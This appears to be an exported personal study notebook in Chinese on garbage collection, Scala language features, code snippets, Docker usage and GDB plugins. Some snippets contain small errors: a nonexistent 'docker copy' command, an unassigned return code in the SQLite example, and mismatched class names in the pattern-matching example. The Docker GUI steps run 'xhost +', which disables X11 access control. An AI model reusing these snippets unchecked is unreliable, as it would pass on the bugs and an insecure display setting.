<p>标记-整理算法：标记-复制算法在对象存活率较高时就要进行较多的复制操作，效率将会降低。针对老年代对象的存亡特征，1974年Edward Lueders提出了另外一种有针对性的“标记-整理”（Mark-Compact）算法，其中的标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向内存空间一端移动，然后直接清理掉边界以外的内存。<strong>移动存活对象并更新所有引用这些对象的地方将会是一种极为负重的操作，而且这种对象移动操作必须全程暂停用户应用程序才能进行</strong>。所以可以将标记-清除算法和标记-整理算法综合使用。</p>
</li>
</ol>
<hr />
<p>给每个线程留下一点线程专属缓冲区，访问缓冲区的时候可以不用全局的锁定。缓冲区用完了分配缓冲区才需要加锁。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="scala中一些函数式概念"><a class="header" href="#scala中一些函数式概念">Scala中一些函数式概念</a></h1>
<h2 id="柯里化"><a class="header" href="#柯里化">柯里化</a></h2>
<blockquote>
<p>柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。</p>
</blockquote>
<p>看一个简单的例子，Scala的。原谅我是一个初学者。</p>
<pre><code class="language-scala">object Main {
  def test(x: Int, y: Int): Int = {
    x / y
  }
}
</code></pre>
<p>对于test函数，符合我们常识（非函数式编程人的常识）的调用方法是<code>test(4,2)</code>。然而像下面这样调用也是可以的。<code>test(_, 4)</code>先生成了一个<code>(Int) =&gt; Int</code>的函数，然后再用2作为参数去调用这个函数。<code>_</code>是一个占位符。所以在Scala中命名变量的时候不要用<code>_</code>作为分隔符，这个风格不Scala。</p>
<pre><code class="language-scala">(test(_, 4))(2);
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="泛型擦除"><a class="header" href="#泛型擦除">泛型擦除</a></h1>
<p>Java/Scala的泛型基本上都是在编译器这个层次上实现的，在生成的字节码中是不包含泛型中的类型信息的，使用泛型的时候加上类型参数，在编译器编译的时候会去掉，这个过程称为<strong>类型擦除</strong>。</p>
<pre><code class="language-scala">object Hello {
  def main(args: Array[String]): Unit = {
    val a1: Array[Int] = Array(1, 2, 3)
    val a2: Array[String] = Array(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;)
    println(a1.getClass() == a2.getClass())

    val s1: Set[Int] = Set(1, 2, 3)
    val s2: Set[String] = Set(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;)
    println(s1.getClass == s2.getClass)
  }
}
</code></pre>
<p>比如这一段代码，如果没有类型擦除的话，输出结果应该是<code>false false</code>。有类型擦除的话，输出结果是<code>true true</code>。</p>
<p>不过实际上的输出结果是<code>false true</code>，这是因为Scala/Java<strong>对数组Array的泛型做了特殊的处理，会把类型信息在运行时保存</strong>，在所有其他情况下的泛型都是会在运行时擦除的。</p>
<h2 id="导致的问题"><a class="header" href="#导致的问题">导致的问题</a></h2>
<p>简单列出几个。总之你如果能认识到泛型的类型信息不会在运行时保存，就可以想到会存在这样的问题。</p>
<ol>
<li>
<p>重载报错，如下。由于method在编译完成后的方法前面变成了一样的<code>Set</code>，无法重载。</p>
<pre><code class="language-scala">class Foo {
  def method(a: Set[Int] ) = {}
  def method(a: Set[String]) = {}
}
</code></pre>
</li>
<li>
<p>模式匹配，如下。不要用模式匹配去判断泛型的类型。</p>
<pre><code class="language-scala">val s1: Set[Int] = Set(1, 2, 3)
s1 match {
    case s: Set[String] =&gt; println(&quot;String&quot;)
    case s: Set[Int]    =&gt; println(&quot;Int&quot;)
    case _              =&gt; println(&quot;Unknown&quot;)
}
</code></pre>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="类型-3"><a class="header" href="#类型-3">类型</a></h1>
<blockquote>
<p>里氏替换原则（Liskov Substitution Principle，LSP）：继承必须确保超类所拥有的性质在子类中仍然成立（Inheritance should ensure that any property proved about supertype objects also holds for subtype objects）</p>
</blockquote>
<p>类型系统的设计，就是为了保证里氏替换原则</p>
<h2 id="协变逆变和不变"><a class="header" href="#协变逆变和不变">协变、逆变和不变</a></h2>
<p>在一门程序设计语言的类型系统中，给定</p>
<ul>
<li><code>&lt;=</code>和<code>&gt;=</code>， 表示类型排序关系
<ul>
<li><code>Type1&lt;=Type2</code>表示<code>Type1</code>是 <code>Type2</code>的子类型</li>
<li><code>Type1&gt;=Type2</code>表示<code>Type1</code>是 <code>Type2</code>的超类型</li>
</ul>
</li>
<li><code>f()</code>表示一个类型的构造函数
<ul>
<li>注意它可以是一元函数（接受一个参数），如<code>NewType = f(Type)</code></li>
<li>也可以是多元函数（接受多个参数），如<code>NewType = f(Type1, Type2)</code></li>
</ul>
</li>
</ul>
<p>那么，对于任意两个不同的类型<code>Type1</code> 和 <code>Type2</code>, 这个类型的构造函数<code>f()</code>可以是</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">变型（Variance）</th><th style="text-align: left">定义</th><th style="text-align: left">例子</th></tr></thead><tbody>
<tr><td style="text-align: left">协变的（covariant）</td><td style="text-align: left">当且仅当它保持了类型排序关系</td><td style="text-align: left">如果<code>Type1&lt;=Type2</code>，那么<code>f(Type1)&lt;=f(Type2)</code></td></tr>
<tr><td style="text-align: left">逆变的（contravariant）</td><td style="text-align: left">当且仅当它逆转了类型排序关系</td><td style="text-align: left">如果<code>Type1&lt;=Type2</code>，那么<code>f(Type1)&gt;=f(Type2)</code></td></tr>
<tr><td style="text-align: left">不变的（invariant or nonvariant）</td><td style="text-align: left">既不保持也不逆转类型排序关系</td><td style="text-align: left">不论<code>Type1</code> 和 <code>Type2</code>的关系，<code>f(Type1)</code> 和<code>f(Type2)</code> 没有关系</td></tr>
</tbody></table>
</div>
<h2 id="scala-1"><a class="header" href="#scala-1">Scala</a></h2>
<p>我们将可以使用<strong>类型参数</strong>的地方称作一个点position。</p>
<p>编译器会检查类的类型参数的每一次使用。用<code>+</code>注解的类型参数只能用在协变点；用<code>-</code>注解的类型参数只能用在逆变点；而没有型变注解的类型参数可以用在任何能出现类型参数的点，因此这也是唯一的一种能用在不变点的类型参数。</p>
<blockquote>
<p>为了对<strong>类型参数点</strong>进行归类，编译器从<strong>类型参数声明</strong>开始，逐步深入更深的嵌套层次。<strong>声明该类型参数的类的顶层的点被归类为协变点</strong>。更深的嵌套层次默认为与包含它的层次相同，不过在一些例外情况下归类会发生变化。<strong>方法值参数的点</strong>被归类为方法外的<strong>翻转</strong>（flipped），其中协变点的翻转是逆变点，逆变点的翻转是协变点，而不变点的翻转仍然是不变点。
除了方法值参数，当前的归类在<strong>方法的类型参数</strong>上也会翻转。归类有时会在类型的类型入参处翻转，如C[Arg]中的Arg，具体取决于相应的类型参数的型变。如果C的类型参数添加了+注解，则归类保持不变；如果C的类型参数添加了-注解，则当前的归类会翻转；而如果C的类型参数没有型变注解，则当前归类保持不变。</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sbt"><a class="header" href="#sbt">sbt</a></h1>
<p>sbt是被广泛使用的scala构建工具。</p>
<h2 id="hello-world-3"><a class="header" href="#hello-world-3">hello world</a></h2>
<p>https://www.scala-sbt.org/1.x/docs/sbt-by-example.html</p>
<pre><code class="language-sh">mkdir hello-sbt
cd hello-sbt
mkdir src         # 放源代码
touch build.sbt   # 配置文件 
sbt
</code></pre>
<p>接着在你的工程目录下面，就可以执行sbt命令获得一个sbt shell了。在sbt shell中可以执行</p>
<ul>
<li><code>help</code>: 获取帮助:star2:</li>
<li><code>compile</code>: 编译工程</li>
<li><code>~compile</code>: 持续编译工程，发现源代码有更新就会编译</li>
<li><code>run</code>: 运行工程</li>
<li><code>reload</code>: 重新加载<code>build.sbt</code>文件</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="trait-4"><a class="header" href="#trait-4">trait</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="枚举"><a class="header" href="#枚举">枚举</a></h1>
<h2 id="edt"><a class="header" href="#edt">EDT</a></h2>
<p>Scala3引入了枚举EDT。下面这个简单的枚举会生成一个叫做Direction的<strong>密封类</strong>，其伴生对象将包含4个被声明为Value的值。</p>
<pre><code class="language-scala">enum Direction:
	case North, East, South, West
</code></pre>
<p>根据我们的经验，枚举和匹配一起使用是很自然的</p>
<pre><code class="language-scala">def invert(dir: Direction): Direction = 
	dir match
		case North =&gt; South
		case East =&gt; West
		case South =&gt; North
		case West =&gt; East
</code></pre>
<p>可以给EDT传入值参数，如下，我们就可以访问对应的参数like <code>North.degrees</code></p>
<pre><code class="language-scala">enum Direction(val degrees: Int):
	case North extends Direction(0)
	case East extends Direction(90)
	case South extends Direction(180)
	case West extends Direction(270)
</code></pre>
<h2 id="adt"><a class="header" href="#adt">ADT</a></h2>
<p>来看看更强大的ADT，和Rust中的Enum类似了。</p>
<p>看看类似Rust中Option在Scala的表达方式，这里的泛型参数注解为协变。</p>
<pre><code class="language-scala">enum Result[+T, +E] {
  case Ok(value: T)
  case Err(error: E)
}

val a = Result.Ok(12)         // Result[Int, Nothing]
val b = Result.Err(&quot;error&quot;)   // Result[Nothing, String]
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="样例类和模式匹配"><a class="header" href="#样例类和模式匹配">样例类和模式匹配</a></h1>
<h2 id="case-class-样例类"><a class="header" href="#case-class-样例类">case class 样例类</a></h2>
<pre><code class="language-scala">trait Expr;
case class Var(name: String) extends Expr;
case class Num(number: Double) extends Expr;
case class Unary(operator: String, arg: Expr) extends Expr;
case class Binary(operator: String, left: Expr, right: Expr) extends Expr;
</code></pre>
<h2 id="pattern-matching-模式匹配"><a class="header" href="#pattern-matching-模式匹配">pattern matching 模式匹配</a></h2>
<p>模式匹配是检查某个<strong>值</strong>（value）是否<strong>匹配</strong>某一个<strong>模式</strong>的机制，<strong>一个成功的匹配同时会将匹配值解构为其组成部分</strong>。它是Java中的<code>switch</code>语句的升级版，同样可以用于替代一系列的 if/else 语句。</p>
<p>这是一个表达式化简的例子。<code>expr</code>将进行模式匹配，注意</p>
<ul>
<li>模式匹配返回的值类型应该相同，在这里都是<code>Expr</code></li>
<li>一个默认的匹配<code>case _</code>是应该要有的。虽然编译时不会报错（不同于Rust），但是在运行时发现value没有得到匹配是会抛出异常<code>MatchError</code>的。</li>
<li>你会发现这里的模式就是构造函数。用构造函数来匹配案例类。当然我们最容易理解的常量匹配（C语言里的switch）也是可以的。</li>
</ul>
<pre><code class="language-scala">def simplify(expr: Expr): Expr = 
	expr match {
        case UnOp(&quot;-&quot;,UnOp(&quot;-&quot;,e)) =&gt; e  // e是一个变量哦，变量可以匹配任何值并捕获
        case BinOp(&quot;+&quot;,e,Num(0)) =&gt; e
        case BinOp(&quot;*&quot;,e,Num(1)) =&gt; e
        case BinOp(&quot;*&quot;, _, Num(0)) | BinOp(&quot;*&quot;, Num(0), _) =&gt; Num(0); 
        	// _是我们不关心的变量，可以匹配任何值不捕获
        case _ =&gt; expr
    }
</code></pre>
<p>匹配的种类：</p>
<ol>
<li>常量模式、变量模式</li>
<li>构造方法模式</li>
<li>序列模式</li>
<li>元组模式</li>
<li>带类型的模式，但是Scala和Java一样有泛型擦除，运行时不会保存泛型类型信息。</li>
</ol>
<h2 id="其他的模式匹配"><a class="header" href="#其他的模式匹配">其他的模式匹配</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="测试和文档"><a class="header" href="#测试和文档">测试和文档</a></h1>
<h2 id="scalatest"><a class="header" href="#scalatest">ScalaTest</a></h2>
<h2 id="scaladoc"><a class="header" href="#scaladoc">ScalaDoc</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="类的组合和继承"><a class="header" href="#类的组合和继承">类的组合和继承</a></h1>
<h2 id="any-anyval-anyref"><a class="header" href="#any-anyval-anyref"><a href="https://www.scala-lang.org/api/current/scala/Any.html">Any</a>, <a href="https://www.scala-lang.org/api/current/scala/AnyVal.html">AnyVal</a>, <a href="https://www.scala-lang.org/api/current/scala/AnyRef.html">AnyRef</a></a></h2>
<blockquote>
</blockquote>
<h3 id="自定义值类"><a class="header" href="#自定义值类">自定义值类</a></h3>
<p>与内建的值类一样，你的值类的实例通常也会被编译成那种不使用包装类的Java字节码。在需要包装类的上下文里，如泛型代码，值将被自动装箱和拆箱。</p>
<p>只有特定的几个类可以成为值类。要想使某个类成为值类</p>
<ol>
<li>它必须有且仅有一个参数</li>
<li>在内部除def之外不能有任何其他内容。</li>
<li>不能有其他类扩展自值类</li>
<li>值类不能重新定义<code>equals</code>或<code>hashCode</code>方法。</li>
</ol>
<p>要定义值类，需要将它处理成<code>AnyVal</code>类的子类，并在它唯一的参数前加上<code>val</code>。比如</p>
<pre><code class="language-scala">class Dollars(val amount: Int) extends AnyVal:
	override def toString = &quot;$&quot;+amount

class Text(val value:String) extends AnyVal 
</code></pre>
<h2 id="null-nothing"><a class="header" href="#null-nothing"><a href="https://www.scala-lang.org/api/current/scala/Null.html">Null</a>, <a href="https://www.scala-lang.org/api/current/scala/Nothing.html">Nothing</a></a></h2>
<h2 id="交集类型和并集类型"><a class="header" href="#交集类型和并集类型">交集类型和并集类型</a></h2>
<p>交集类型是所有其构成类型的排列组合的子类型。例如，类型<code>B &amp; I &amp; F</code>是类型<code>B</code>、<code>I</code>、<code>F</code>、<code>B &amp; I</code>、<code>B &amp; F</code>、<code>I &amp; F</code>的子类型，满足交换律和结合率。因此，类型<code>B &amp; I &amp; F</code>也是类型<code>I &amp; B</code>、<code>F &amp; B</code>、<code>F &amp; I</code>、<code>B &amp; F &amp; I</code>、<code>F &amp; B &amp; I</code>等的子类型。</p>
<p>并集类型是类似的，<code>B | I | F</code>是<code>B</code>、<code>I</code>、<code>F</code>、<code>B | I</code>、<code>B | F</code>、<code>I | F</code>的超类型，也满足交换律和结合率。</p>
<p>回忆一下，我们可以在声明为父类的变量绑定子类、在子类中调用父类的方法。但是把父类赋值给子类、在父类调用子类的方法，应该先使用模式匹配等方法进行类型判断。</p>
<p>Scala中的命名空间只有两个，<strong>值（字段、方法、包和单例对象）<strong>和</strong>类型（类和特质名）</strong>。</p>
<p>类默认继承自<code>Any</code>。覆盖基类的方法，必须要用<code>override</code>关键字。如果要禁止子类覆盖基类的方法，在基类方法前面加上<code>final</code>关键字的限制。</p>
<p>类中字段默认是public的，<code>private</code>需要额外修饰。这个和Java是恰恰相反的。</p>
<p>参数化字段。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="snippets-1"><a class="header" href="#snippets-1">Snippets</a></h1>
<p>Snippets按照语言分类，后续会根据这些写一个前端，可以按tag查询。</p>
<pre><code class="language-markdown">###### title (tag1) (tag2) ... (tagN)

discription

```language
code
```
</code></pre>
<ul>
<li>tag不区分大小写，非ASCII英文字符会被无视。</li>
<li>title和discription可以使用中文</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h6 id="sqlite-2"><a class="header" href="#sqlite-2">SQLite</a></h6>
<p>一个简单的接入SQLite数据库的例子。安装SQLite库，<code>gcc demo.c -lsqlite3</code></p>
<ul>
<li>两个核心类型
<ul>
<li>sqlite3: 句柄，代表连接</li>
<li>sqlite3_stmt: statement，可以简单理解为 sql 语句的抽象</li>
</ul>
</li>
<li>八个核心 APIs
<ul>
<li>sqlite3_open/sqlite3_close: 用于打开/关闭连接</li>
<li>sqlite3_prepare/sqlite3_finalize: 创建/销毁 statement</li>
<li>sqlite3_bind 系列: 为 statement 绑定参数</li>
<li>sqlite3_step: 执行 statement，对于 select 语句，可能要执行多次</li>
<li>sqlite3_reset: 将 statement 恢复到初始状态（譬如解除绑定的参数），以便重复使用</li>
<li>sqlite3_exec: sqlite3_prepare/sqlite3_step/sqlite3_finalize 的 wrapper</li>
</ul>
</li>
</ul>
<pre><code class="language-c">#include &lt;sqlite3.h&gt;
#include &lt;stdio.h&gt;
const char *INSERT_SQL =
    &quot;REPLACE INTO settings(key, value) VALUES('hello','world');&quot;;

int main() {
  int rc;
  sqlite3 *db;
  sqlite3_stmt *stmt;
  rc = sqlite3_open_v2(&quot;data/db.db&quot;, &amp;db,
                       SQLITE_OPEN_READWRITE | SQLITE_OPEN_FULLMUTEX, 0);
  if (rc) {
    fprintf(stderr, &quot;Can't open database: %s\n&quot;, sqlite3_errmsg(db));
    return (0);
  } else {
    fprintf(stdout, &quot;Opened database successfully\n&quot;);
  }

  sqlite3_prepare_v2(db, INSERT_SQL, -1, &amp;stmt, 0);
  if (rc != SQLITE_OK) {
    fprintf(stderr, &quot;Failed to fetch data: %s\n&quot;, sqlite3_errmsg(db));
    sqlite3_close(db);
    return 1;
  }

  rc = sqlite3_step(stmt);
  
  if (rc != SQLITE_DONE) {
    fprintf(stderr, &quot;Failed to insert table\n&quot;);
    fprintf(stderr, &quot;SQL error: %s\n&quot;, sqlite3_errmsg(db));
  } else {
    fprintf(stdout, &quot;Table Friends created successfully\n&quot;);
  }
  
  sqlite3_finalize(stmt);
  sqlite3_close(db);
  return 0;
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h6 id="添加用户到组"><a class="header" href="#添加用户到组">添加用户到组</a></h6>
<pre><code class="language-shell">usermod -a -G groupA user
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h6 id="json-2"><a class="header" href="#json-2">JSON</a></h6>
<p>json字符串和对象之间的转换</p>
<pre><code class="language-python">import json
&lt;str&gt;    = json.dumps(&lt;object&gt;)    # Converts object to JSON string.
&lt;object&gt; = json.loads(&lt;str&gt;)       # Converts JSON string to object.
</code></pre>
<p>文件和json对象之间的转换</p>
<pre><code class="language-python">def read_json_file(filename):
    with open(filename, encoding='utf-8') as file:
        return json.load(file)
def write_to_json_file(filename, an_object):
    with open(filename, 'w', encoding='utf-8') as file:
        json.dump(an_object, file, ensure_ascii=False, indent=2)
</code></pre>
<h6 id="遍历文件系统"><a class="header" href="#遍历文件系统">遍历文件系统</a></h6>
<pre><code class="language-python"></code></pre>
<div style="break-before: page; page-break-before: always;"></div><h6 id="过程宏示例"><a class="header" href="#过程宏示例">过程宏示例</a></h6>
<p>示例里面给了详细的注释，可以根据这个为模板编写过程宏（代码是derive macro）</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>https://github.com/reticenceji/merge_struct
<span class="boring">}
</span></code></pre></pre>
<h6 id="arcweak的使用"><a class="header" href="#arcweak的使用">Arc::Weak的使用</a></h6>
<p>把一个<code>Arc&lt;T&gt;</code>进行跨线程传递的方式，很容易想到是<code>clone</code>。但是在某些场景，这个子线程可能不会立刻被执行，并且不希望被这个子线程的引用计数导致无法释放。。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let new_shared = Arc::downgrade(shared);
shared.config.thread_pool.execute_after(delay, move || {
  let shared = match new_shared.upgrade() {
    Some(shared) =&gt; shared,
    None =&gt; return,
  };
  ...
});
<span class="boring">}
</span></code></pre></pre>
<h6 id="debug的实现"><a class="header" href="#debug的实现">Debug的实现</a></h6>
<p>一般我们直接derive实现Debug，不过如果我们的结构体内有我们不想展示的字段，也可以自定义实现Debug。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl fmt::Debug for State {
    fn fmt(&amp;self, fmt: &amp;mut fmt::Formatter) -&gt; fmt::Result {
        fmt.debug_struct(&quot;State&quot;)
            .field(&quot;connections&quot;, &amp;self.connections)
            .field(&quot;idle_connections&quot;, &amp;self.idle_connections)
            .finish()
    }
}
<span class="boring">}
</span></code></pre></pre>
<h6 id="建造者模式"><a class="header" href="#建造者模式">建造者模式</a></h6>
<p>如果一个类有很多个配置项，可以用建造者模式。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl Builder{
  pub fn new() -&gt; Self {
    Builder::default()
  }
  pub fn config1(mut self, config1: i32) -&gt; Self {
    self.config1 = config1;
    self
  } 
  pub fn config2(mut self) -&gt; Self {} 
  pub fn config3(mut self) -&gt; Self {} 
  pub fn config4(mut self) -&gt; Self {} 
  pub fn config5(mut self) -&gt; Self {} 
  
  pub fn build(self) -&gt; Result&lt;Pool, Error&gt; {}
}
impl Pool {
  pub fn new() -&gt; Result&lt;Pool, Error&gt; {
    Pool::builder().build()
  }

  pub fn builder() -&gt; Builder {
    Builder::new()
  }
}
<span class="boring">}
</span></code></pre></pre>
<h6 id="costtimerecorder"><a class="header" href="#costtimerecorder">CostTimeRecorder</a></h6>
<ol>
<li>Callback function</li>
<li><code>Drop</code> trait</li>
<li>Document test</li>
</ol>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::time::{Duration, Instant};

pub struct CostTimeRecorder {
    last_mark: Instant,
    records: Vec&lt;(String, Duration)&gt;,
    drop_callback: Option&lt;Box&lt;dyn FnOnce(Duration) + 'static + Send&gt;&gt;,
}
impl Default for CostTimeRecorder {
    fn default() -&gt; Self {
        Self {
            last_mark: Instant::now(),
            records: Default::default(),
            drop_callback: Default::default(),
        }
    }
}

impl CostTimeRecorder {
    pub fn new() -&gt; Self {
        Self::default()
    }

    /// Total time cost from the create time to the last mark
    pub fn total(&amp;self) -&gt; Duration {
        self.records
            .iter()
            .fold(Duration::new(0, 0), |init, item| init + item.1)
    }

    pub fn records(&amp;self) -&gt; &amp;[(String, Duration)] {
        self.records.as_ref()
    }

    /// Set `Drop` callback for the `CostTimeRecorder` which will be executed when `CostTimeRecorder` out of scope.
    /// The parameter is the total lifetime of the `CostTimeRecorder`
    ///
    /// ```rust
    /// # use cost_time_recorder::CostTimeRecorder;
    /// let mut ctr = CostTimeRecorder::new();
    /// let callback = Box::new(|total: std::time::Duration| {
    ///     assert!(total.as_secs() &gt;= 2);
    /// });
    /// ctr.set_drop_callback(callback);
    /// std::thread::sleep(std::time::Duration::from_secs(2));
    /// ```
    pub fn set_drop_callback(&amp;mut self, drop_callback: Box&lt;dyn FnOnce(Duration) + 'static + Send&gt;) {
        self.drop_callback = Some(drop_callback);
    }
}
impl CostTimeRecorder {
    pub fn mark&lt;T&gt;(&amp;mut self, lable: T)
    where
        T: ToString,
    {
        let now = Instant::now();
        if let Some(duration) = now.checked_duration_since(self.last_mark) {
            self.records.push((lable.to_string(), duration));
            self.last_mark = now;
        }
    }
}

impl Drop for CostTimeRecorder {
    fn drop(&amp;mut self) {
        if let Some(f) = self.drop_callback.take() {
            self.mark(&quot;drop_mark&quot;);
            f(self.total());
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<h6 id="读取文件-buffer"><a class="header" href="#读取文件-buffer">读取文件 (buffer)</a></h6>
<p>如果文件并不是完全随机的读取，那么往往添加一个Buffer可以显著提高效率。在Rust中任何实现了<code>Read</code>的类都可以创建<code>BufReader</code>，如下。<code>BufReader</code>实现了<code>BufRead</code>，其抽象了带有Buffer的Reader的通用方法。所以，如果一个类已经实现了<code>BufRead</code>，说明他已经存在了一个内部的Buffer，那么就没有必要再为其套一个<code>BufReader</code>了。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let f = File::open(&quot;foo.txt&quot;)?;
let f = BufReader::new(f);
<span class="boring">}
</span></code></pre></pre>
<h6 id="读取标准输入"><a class="header" href="#读取标准输入">读取标准输入</a></h6>
<p>我们直接使用<code>stdin()</code>方法获得的<code>Stdin</code>也实现了<code>Read</code>，但是每次读入的时候都会自动加锁。如果我们的程序是单线程的话其实这是没有必要的，可以直接获取一个带锁的<code>StdinLock</code>，后续的读就不会加锁了。另外<code>StdinLock</code>是具有内部的缓存的，实现了<code>BufRead</code>，没有必要在套一个<code>BufReader</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let stdin: Stdin = std::io::stdin();
let mut stdin: StdinLock = stdin.lock(); // 在自己写代码的时候可以写在一行中
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tools"><a class="header" href="#tools">Tools</a></h1>
<p>介绍一些使用工具的经验和踩坑吧。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="docker"><a class="header" href="#docker">Docker</a></h1>
<h2 id="docker是什么"><a class="header" href="#docker是什么">Docker是什么</a></h2>
<blockquote>
<p>Docker is a set of platform as a service (PaaS) products that use OS-level virtualization to deliver software in packages called containers.</p>
</blockquote>
<p>他还是依赖主机的环境提供虚拟，好处是快速打包环境。</p>
<h2 id="docker中重要的概念"><a class="header" href="#docker中重要的概念">Docker中重要的概念</a></h2>
<ul>
<li><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。	</li>
<li><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li>
<li><strong>仓库（Repository）</strong>：仓库可看成一个代码控制中心，用来保存镜像。</li>
</ul>
<h2 id="目前常用的命令"><a class="header" href="#目前常用的命令">目前常用的命令</a></h2>
<pre><code class="language-shell">docker container ls -a	#查看所有的Container
docker ps 	#查看活动的Container
docker images	#查看所有的Image
docker start -i ID		#打开Container，对应的是stop
docker exec -it ID /bin/bash	#打开正在运行的Container，从这里退出不会导致Container的停止
docker copy ID:file_in_docker file_in_host       #把docker中的文件拷贝到主机中。
docker run -it -v `pwd`:/home/oslab/lab1 -u oslab -w /home/oslab 6786 /bin/bash		#和本地建立映射，注意只有image创建container的时候才可以，创建完container之后就不行了
</code></pre>
<h2 id="docker在容器中运行gui软件并显示界面"><a class="header" href="#docker在容器中运行gui软件并显示界面">Docker在容器中运行GUI软件并显示界面</a></h2>
<p>核心是使用本地显示器，要在启动docker image前添加一些配置</p>
<ol>
<li>首先在本机里安装相关依赖（只需执行一次，之后的命令每次启动需要GUI的docker都需要执行）</li>
</ol>
<pre><code class="language-bash">sudo apt-get install x11-xserver-utils
复制代码
</code></pre>
<ol>
<li>开放权限</li>
</ol>
<pre><code class="language-bash">xhost +
复制代码
</code></pre>
<ol>
<li>添加docker参数选项
<ul>
<li><code>-v /tmp/.X11-unix:/tmp/.X11-unix \</code>: 共享本地unix端口</li>
<li><code>-e DISPLAY=unix$DISPLAY \</code>: 修改环境变量DISPLAY</li>
<li><code>-e GDK_SCALE</code></li>
<li><code>-e GDK_DPI_SCALE</code></li>
</ul>
</li>
</ol>
<p>最终启动<code>testname:v0</code>镜像的命令是：</p>
<pre><code class="language-bash">xhost +

sudo docker run -it \
  -v /etc/localtime:/etc/localtime:ro \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  -e DISPLAY=unix$DISPLAY \
  -e GDK_SCALE \
  -e GDK_DPI_SCALE \
  testname:v0 \
  /bin/bash
复制代码
</code></pre>
<p>之后在容器中启动一些画图或者gui窗口，就可以利用本机的显示屏进行窗口显示量</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gdb-1"><a class="header" href="#gdb-1">GDB</a></h1>
<p><a href="https://sourceware.org/gdb/current/onlinedocs/gdb/">Doc</a>,<a href="https://gef.readthedocs.io/en/master/commands/assemble/">Gef-Doc</a></p>
<p>在gdb中查看命令帮助的方法是<code>help command</code></p>
<h2 id="插件安装"><a class="header" href="#插件安装">插件安装</a></h2>
<p>修改<code>~/.gdbinit</code>文件：</p>
<pre><code># 注释掉你不想用的插件
source /data/home/reticence/AAA/gdb/gdbinit-gef.py
#source /data/home/reticence/AAA/gdb/peda/peda.py
</code></pre>
<ul>
<li><a href="https://github.com/hugsy/gef">gef</a>是一个优秀的GDB插件，帮助我们使用GDB进行逆向和漏洞挖掘。他支持多种架构。
安装非常简单，一般的配置都是Linux默认带有的。你可以按照官网的安装脚本，也可以复制<a href="https://github.com/hugsy/gef/blob/dev/gef.py">gef.py</a>的源代码到你本地的一个文件，然后在.gdbinit里加上就好了。</li>
<li><a href="https://github.com/longld/peda">peda</a>，也是一个强力的帮助逆向的GDB插件，不过支持的架构少。安装的话直接<code>git clone https://github.com/longld/peda.git</code>，然后在.gdbinit里加上peda.py就好了。</li>
</ul>
<h2 id="裸机程序调试指南"><a class="header" href="#裸机程序调试指南">裸机程序调试指南</a></h2>
<p>首先我们要搞清楚，调试信息和符号表。我们在用gcc编译一个二进制的时候，默认是不加调试信息，但是不去除符号表的。这两个东西都可以辅助我们进行调试。一般来说，一个软件的release版本是不带调试信息的，逆向的软件当然也不会带调试信息。</p>
<h3 id="汇编代码"><a class="header" href="#汇编代码">汇编代码</a></h3>
<ul>
<li>
<p><code>display</code>: Print value of expression EXP each time the program stops.</p>
</li>
<li>
<p><code>assemble</code>: 这个命令可以把指令汇编成二进制</p>
<ul>
<li><code>asm 指令1; 指令2; ......;</code>显示汇编</li>
<li><code>asm -l 地址 指令1; 指令2; ......</code>可以直接把汇编的内容写进内存</li>
</ul>
</li>
<li>
<p><code>disassemble</code>: 可以把打印当前函数的汇编代码，通过指定参数可以反汇编任意一段内存的汇编代码。</p>
<ul>
<li>
<p>如果要在任意情况下反汇编后面要执行的代码：</p>
<pre><code>(gdb) set disassemble-next-line on
</code></pre>
</li>
<li>
<p>如果要在后面的代码没有源码的情况下才反汇编后面要执行的代码：</p>
<pre><code>(gdb) set disassemble-next-line auto
</code></pre>
</li>
</ul>
</li>
</ul>
<h3 id="控制流"><a class="header" href="#控制流">控制流</a></h3>
<ol>
<li><code>entry-break</code>：gef中一个强大的命令，让程序在开始处停顿。他会依次检查<code>main</code>,<code>__libc_start_main</code>,ELF中规定的<code>Entry point</code>。在gdb中，<code>start</code>是类似的命令。</li>
